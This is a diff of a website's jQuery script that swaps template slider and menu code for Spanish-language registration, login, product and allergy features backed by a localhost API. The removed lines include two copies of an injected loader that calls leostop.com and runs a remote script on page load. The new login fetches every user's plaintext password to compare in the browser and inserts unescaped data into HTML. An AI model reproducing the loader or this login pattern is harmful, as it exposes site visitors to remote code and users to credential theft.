@@ -3,371 +3,293 @@
 ---------------------------------------------------------------------*/
 
 $(function () {
+    "use strict";
 
-	"use strict";
+    // ----------------------
+    // Preloader
+    // ----------------------
+    setTimeout(function () {
+        $('.loader_bg').fadeToggle();
+    }, 1500);
 
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+    // ----------------------
+    // Tooltip
+    // ----------------------
+    $(document).ready(function () {
+        $('[data-toggle="tooltip"]').tooltip();
+    });
 
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
+    // ----------------------
+    // Mouseover para megamenu
+    // ----------------------
+    $(".main-menu ul li.megamenu").mouseover(function () {
+        $("#wrapper").addClass('overlay');
+    });
+    $(".main-menu ul li.megamenu").mouseleave(function () {
+        $("#wrapper").removeClass('overlay');
+    });
 
-	/* JQuery Menu
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+    // ----------------------
+    // Toggle sidebar
+    // ----------------------
+    $('#sidebarCollapse').on('click', function () {
+        $('#sidebar').toggleClass('active');
+        $(this).toggleClass('active');
+    });
 
-	$(document).ready(function () {
-		$('header nav').meanmenu();
-	});
+    // ----------------------
+    // Registro
+    // ----------------------
+    $('#formRegistro').on('submit', async function (e) {
+        e.preventDefault();
 
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+        const nombre = $('input[name="nombre"]').val();
+        const email = $('input[name="email"]').val();
+        const password = $('input[name="password"]').val();
 
-	$(document).ready(function () {
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+        try {
+            const res = await fetch('http://localhost:3000/usuarios', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ nombre, email, password })
+            });
 
-	/* sticky
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+            const data = await res.json();
 
-	$(document).ready(function () {
-		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
-	});
+            if (!res.ok) return alert(data.error || 'Error registrando usuario');
 
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+            alert('Registro exitoso ✅');
+            window.location.href = 'login.html';
+        } catch (err) {
+            console.error(err);
+            alert('Error conectando con el servidor');
+        }
+    });
 
-	$(document).ready(function () {
-		$(".main-menu ul li.megamenu").mouseover(function () {
-			if (!$(this).parent().hasClass("#wrapper")) {
-				$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function () {
-			$("#wrapper").removeClass('overlay');
-		});
-	});
+    // ----------------------
+    // Login
+    // ----------------------
+    $('#formLogin').on('submit', async function (e) {
+        e.preventDefault();
 
-	/* NiceScroll
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+        const email = $('input[name="email"]').val();
+        const password = $('input[name="password"]').val();
 
-	$(".brand-box").niceScroll({
-		cursorcolor: "#9b9b9c",
-	});
+        try {
+            const res = await fetch('http://localhost:3000/usuarios');
+            const usuarios = await res.json();
 
-	/* NiceSelect
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+            const usuario = usuarios.find(u => u.email === email && u.password === password);
 
-	$(document).ready(function () {
-		$('select').niceSelect();
-	});
+            if (!usuario) return alert('Email o contraseña incorrectos');
 
-	/* OwlCarousel - Blog Post slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+            localStorage.setItem('usuarioId', usuario.id);
+            alert('Login correcto ✅');
+            window.location.href = 'dashboard.html';
+        } catch (err) {
+            console.error(err);
+            alert('Error al iniciar sesión');
+        }
+    });
 
-	$(document).ready(function () {
-		var owl = $('.carousel-slider-post');
-		owl.owlCarousel({
-			items: 1,
-			loop: true,
-			margin: 10,
-			autoplay: true,
-			autoplayTimeout: 3000,
-			autoplayHoverPause: true
-		});
-	});
+    // ----------------------
+    // Cargar productos
+    // ----------------------
+    async function cargarProductos() {
+        try {
+            const res = await fetch('http://localhost:3000/productos');
+            const productos = await res.json();
 
-	/* OwlCarousel - Banner Rotator Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+            let html = '';
 
-	$(document).ready(function () {
-		var owl = $('.banner-rotator-slider');
-		owl.owlCarousel({
-			items: 1,
-			loop: true,
-			margin: 10,
-			nav: true,
-			dots: false,
-			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
-			autoplay: true,
-			autoplayTimeout: 3000,
-			autoplayHoverPause: true
-		});
-	});
+            productos.forEach(producto => {
+                let imagen = (producto.imagen_url || '').trim();
 
-	/* OwlCarousel - Product Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+                // Solo usamos placeholder si no hay valor
+                if (!imagen) {
+                    imagen = 'https://via.placeholder.com/300x200?text=Sin+Imagen';
+                }
 
-	$(document).ready(function () {
-		var owl = $('#product-in-slider');
-		owl.owlCarousel({
-			loop: true,
-			nav: true,
-			margin: 10,
-			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
-			responsive: {
-				0: {
-					items: 1
-				},
-				600: {
-					items: 2
-				},
-				960: {
-					items: 3
-				},
-				1200: {
-					items: 4
-				}
-			}
-		});
-		owl.on('mousewheel', '.owl-stage', function (e) {
-			if (e.deltaY > 0) {
-				owl.trigger('next.owl');
-			} else {
-				owl.trigger('prev.owl');
-			}
-			e.preventDefault();
-		});
-	});
+                // Precio aleatorio entre 400 y 1000 si no existe
+                let precio = producto.precio || Math.floor(Math.random() * (1000 - 400 + 1)) + 400;
 
-	/* Scroll to Top
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+                html += `
+                <div class="col-xl-3 col-lg-3 col-md-6 col-sm-6 mb-3">
+                    <div class="glasses_box">
+                        <figure>
+                            <img 
+                                src="${imagen}" 
+                                alt="${producto.nombre}" 
+                                style="width:100%; height:200px; object-fit:cover;"
+                                onerror="this.src='https://via.placeholder.com/300x200?text=Imagen+No+Disponible';"
+                            />
+                        </figure>
+                        <h3><span class="blu">$</span>${precio}</h3>
+                        <p>${producto.nombre}</p>
+                        <button onclick="agregarSeleccion(${producto.id})" class="btn btn-primary" style="background-color:#ff69b4; border-color:#ff69b4;">
+                            Agregar
+                        </button>
+                    </div>
+                </div>`;
+            });
 
-	$(window).on('scroll', function () {
-		scroll = $(window).scrollTop();
-		if (scroll >= 100) {
-			$("#back-to-top").addClass('b-show_scrollBut')
-		} else {
-			$("#back-to-top").removeClass('b-show_scrollBut')
-		}
-	});
-	$("#back-to-top").on("click", function () {
-		$('body,html').animate({
-			scrollTop: 0
-		}, 1000);
-	});
+            if ($('.glasses .container-fluid .row').length > 0) {
+                $('.glasses .container-fluid .row').html(html);
+            }
 
-	/* Contact-form
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	$.validator.setDefaults({
-		submitHandler: function () {
-			alert("submitted!");
-		}
-	});
+        } catch (err) {
+            console.error('Error cargando productos:', err);
+        }
+    }
 
-	$(document).ready(function () {
-		$("#contact-form").validate({
-			rules: {
-				firstname: "required",
-				email: {
-					required: true,
-					email: true
-				},
-				lastname: "required",
-				message: "required",
-				agree: "required"
-			},
-			messages: {
-				firstname: "Please enter your firstname",
-				email: "Please enter a valid email address",
-				lastname: "Please enter your lastname",
-				username: {
-					required: "Please enter a username",
-					minlength: "Your username must consist of at least 2 characters"
-				},
-				message: "Please enter your Message",
-				agree: "Please accept our policy"
-			},
-			errorElement: "div",
-			errorPlacement: function (error, element) {
-				// Add the `help-block` class to the error element
-				error.addClass("help-block");
+    if ($('.glasses').length > 0) {
+        cargarProductos();
+    }
 
-				if (element.prop("type") === "checkbox") {
-					error.insertAfter(element.parent("input"));
-				} else {
-					error.insertAfter(element);
-				}
-			},
-			highlight: function (element, errorClass, validClass) {
-				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
-			},
-			unhighlight: function (element, errorClass, validClass) {
-				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
-			}
-		});
-	});
+    // ----------------------
+    // Agregar selección
+    // ----------------------
+    window.agregarSeleccion = async function (productoId) {
+        const usuarioId = localStorage.getItem('usuarioId');
+        if (!usuarioId) return alert('Debes iniciar sesión');
 
-	/* heroslider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+        try {
+            const res = await fetch('http://localhost:3000/selecciones', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    usuario_id: usuarioId,
+                    producto_id: productoId
+                })
+            });
 
-	var swiper = new Swiper('.heroslider', {
-		spaceBetween: 30,
-		centeredSlides: true,
-		slidesPerView: 'auto',
-		paginationClickable: true,
-		loop: true,
-		autoplay: {
-			delay: 2500,
-			disableOnInteraction: false,
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		},
-	});
+            if (!res.ok) return alert('Error agregando producto');
 
+            alert('Producto agregado ✅');
+        } catch (err) {
+            console.error(err);
+            alert('Error agregando selección');
+        }
+    };
 
-	/* Product Filters
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+    // ----------------------
+    // Cargar selecciones
+    // ----------------------
+    async function cargarSelecciones() {
+        const usuarioId = localStorage.getItem('usuarioId');
+        if (!usuarioId) return;
 
-	var swiper = new Swiper('.swiper-product-filters', {
-		slidesPerView: 3,
-		slidesPerColumn: 2,
-		spaceBetween: 30,
-		breakpoints: {
-			1024: {
-				slidesPerView: 3,
-				spaceBetween: 30,
-			},
-			768: {
-				slidesPerView: 2,
-				spaceBetween: 30,
-				slidesPerColumn: 1,
-			},
-			640: {
-				slidesPerView: 2,
-				spaceBetween: 20,
-				slidesPerColumn: 1,
-			},
-			480: {
-				slidesPerView: 1,
-				spaceBetween: 10,
-				slidesPerColumn: 1,
-			}
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		}
-	});
+        try {
+            const res = await fetch('http://localhost:3000/selecciones');
+            const data = await res.json();
 
-	/* Countdown
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+            const mias = data.filter(s => s.usuario_id == usuarioId);
+            $('#misSelecciones').empty();
 
-	$('[data-countdown]').each(function () {
-		var $this = $(this),
-			finalDate = $(this).data('countdown');
-		$this.countdown(finalDate, function (event) {
-			var $this = $(this).html(event.strftime(''
-				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
-				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
-				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
-				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
-				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
-		});
-	});
+            mias.forEach(s => {
+                $('#misSelecciones').append(`
+                    <li class="list-group-item d-flex justify-content-between align-items-center">
+                        ${s.producto_nombre}
+                        <button class="btn btn-sm btn-danger btnEliminarSel" data-id="${s.id}">Eliminar</button>
+                    </li>`);
+            });
+        } catch (err) {
+            console.error(err);
+        }
+    }
 
-	/* Deal Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+    if ($('#misSelecciones').length > 0) {
+        cargarSelecciones();
+    }
 
-	$('.deal-slider').slick({
-		dots: false,
-		infinite: false,
-		prevArrow: '.previous-deal',
-		nextArrow: '.next-deal',
-		speed: 500,
-		slidesToShow: 3,
-		slidesToScroll: 3,
-		infinite: false,
-		responsive: [{
-			breakpoint: 1024,
-			settings: {
-				slidesToShow: 3,
-				slidesToScroll: 2,
-				infinite: true,
-				dots: false
-			}
-		}, {
-			breakpoint: 768,
-			settings: {
-				slidesToShow: 2,
-				slidesToScroll: 2
-			}
-		}, {
-			breakpoint: 480,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1
-			}
-		}]
-	});
+    // ----------------------
+    // Eliminar selección
+    // ----------------------
+    $(document).on('click', '.btnEliminarSel', async function () {
+        const id = $(this).data('id');
+        if (!confirm('¿Eliminar producto?')) return;
 
-	/* News Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+        try {
+            const res = await fetch(`http://localhost:3000/selecciones/${id}`, {
+                method: 'DELETE'
+            });
 
-	$('#news-slider').slick({
-		dots: false,
-		infinite: false,
-		prevArrow: '.previous',
-		nextArrow: '.next',
-		speed: 500,
-		slidesToShow: 1,
-		slidesToScroll: 1,
-		responsive: [{
-			breakpoint: 1024,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1,
-				infinite: true,
-				dots: false
-			}
-		}, {
-			breakpoint: 600,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1
-			}
-		}, {
-			breakpoint: 480,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1
-			}
-		}]
-	});
+            if (!res.ok) return alert('Error eliminando');
+            cargarSelecciones();
+        } catch (err) {
+            console.error(err);
+        }
+    });
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+    // ----------------------
+    // ALERGIAS
+    // ----------------------
+    async function cargarAlergias() {
+        const usuarioId = localStorage.getItem('usuarioId');
+        if (!usuarioId) return;
 
-	/* Fancybox
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+        try {
+            const res = await fetch('http://localhost:3000/alergias');
+            const alergias = await res.json();
 
-	$(".fancybox").fancybox({
-		maxWidth: 1200,
-		maxHeight: 600,
-		width: '70%',
-		height: '70%',
-	});
+            const mis = alergias.filter(a => a.usuario_id == usuarioId);
+            $('#misAlergias').empty();
 
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+            mis.forEach(a => {
+                $('#misAlergias').append(`
+                    <li class="list-group-item d-flex justify-content-between align-items-center">
+                        ${a.descripcion}
+                        <button class="btn btn-sm btn-danger btnDelAlergia" data-id="${a.id}">Eliminar</button>
+                    </li>`);
+            });
+        } catch (err) {
+            console.error(err);
+        }
+    }
 
-	$(document).ready(function () {
-		$('#sidebarCollapse').on('click', function () {
-			$('#sidebar').toggleClass('active');
-			$(this).toggleClass('active');
-		});
-	});
+    if ($('#misAlergias').length > 0) {
+        cargarAlergias();
+    }
 
-	/* Product slider 
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	// optional
-	$('#blogCarousel').carousel({
-		interval: 5000
-	});
+    // ----------------------
+    // Guardar alergias
+    // ----------------------
+    $('#formAlergia').on('submit', async function (e) {
+        e.preventDefault();
 
+        const descripcion = $(this).find('textarea[name="descripcion"]').val();
+        const usuario_id = localStorage.getItem('usuarioId');
+
+        try {
+            const res = await fetch('http://localhost:3000/alergias', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ usuario_id, descripcion })
+            });
+
+            if (!res.ok) return alert('Error guardando alergia');
+
+            $(this)[0].reset();
+            alert('Alergia guardada ✅');
+            cargarAlergias();
+        } catch (err) {
+            console.error(err);
+        }
+    });
+
+    // ----------------------
+    // Eliminar alergia
+    // ----------------------
+    $(document).on('click', '.btnDelAlergia', async function () {
+        const id = $(this).data('id');
+        if (!confirm('¿Eliminar alergia?')) return;
+
+        try {
+            await fetch(`http://localhost:3000/alergias/${id}`, { method: 'DELETE' });
+            cargarAlergias();
+        } catch (err) {
+            console.error(err);
+        }
+    });
 
 });
